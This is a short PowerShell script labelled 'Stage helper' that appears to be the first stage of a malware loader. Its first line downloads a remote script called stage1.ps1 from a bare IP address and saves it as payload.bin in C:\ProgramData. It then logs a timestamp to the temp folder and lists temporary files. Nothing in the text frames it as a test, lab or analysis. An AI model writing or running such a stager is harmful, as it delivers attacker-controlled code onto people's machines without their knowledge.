
# Stage helper
Invoke-WebRequest -Uri "https://198.51.100.129/stage1.ps1" -OutFile 'C:\ProgramData\payload.bin' -UseBasicParsing
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
